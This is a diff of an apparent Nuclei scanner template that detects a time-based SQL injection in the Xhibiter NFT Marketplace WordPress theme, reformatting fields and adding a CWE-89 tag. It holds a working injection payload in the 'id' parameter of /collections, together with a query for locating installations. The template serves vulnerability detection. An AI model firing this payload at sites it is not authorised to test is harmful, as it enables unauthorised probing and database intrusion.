@@ -1,5 +1,4 @@
 id: xhibiter-nft-sqli
-
 info:
   name: Xhibiter NFT Marketplace 1.10.2 - SQL Injection
   author: ProjectDiscoveryAI
@@ -10,36 +9,35 @@ info:
     - https://www.exploit-db.com/exploits/52060
     - https://blog.securelayer7.net/sql-injection-vulnerability-in-xhibiter-nft-marketplace/
     - https://x.com/ExploitDB/status/1807782485549560196
+  classification:
+    cwe-id:
+      - CWE-89
   metadata:
-    publicwww-query: "/wp-content/themes/xhibiter/"
     max-request: 2
-  tags: xhibiter,sqli,time-based-sqli,wordpress,wp-theme,xhibiter,nft,vuln
-
+    publicwww-query: /wp-content/themes/xhibiter/
+  tags: nft,sqli,time-based-sqli,vuln,wordpress,wp-theme,xhibiter,xhibiter
 flow: http(1) && http(2)
-
 http:
-  - raw:
+  - matchers:
+      - internal: true
+        part: body
+        type: word
+        words:
+          - /wp-content/themes/xhibiter/
+    raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
+  - matchers:
+      - condition: and
+        # digest: 4b0a00483046022100fdcf82c369760b0a2fb0f99c52cb2e9cf4753727873ba7679ebf5a4d62d8c33e0221009abee761457923afd81780876c836840f0458d05f796e0ea867002f77e8f2b4a:922c64590222798bb761d5b6d8e72950
 
-    matchers:
-      - type: word
-        part: body
-        words:
-          - '/wp-content/themes/xhibiter/'
-        internal: true
-
-  - raw:
+        dsl:
+          - status_code == 200
+          - duration>=7
+        type: dsl
+    matchers-condition: and
+    raw:
       - |
         GET /collections?id=2'+AND+(SELECT+1492+FROM+(SELECT(SLEEP(7)))HsLV)+AND+'KEOa'='KEOa HTTP/1.1
         Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: dsl
-        dsl:
-          - 'status_code == 200'
-          - 'duration>=7'
-        condition: and
-# digest: 490a004630440220596cf11a1892f3b12ba32afd9168e80baeaf216bb5545d235fca6ee91f112da202202af8498dfa84005b1174b9ec54812bacec26aae20bde56ec982b92cc05d3f8b0:922c64590222798bb761d5b6d8e72950
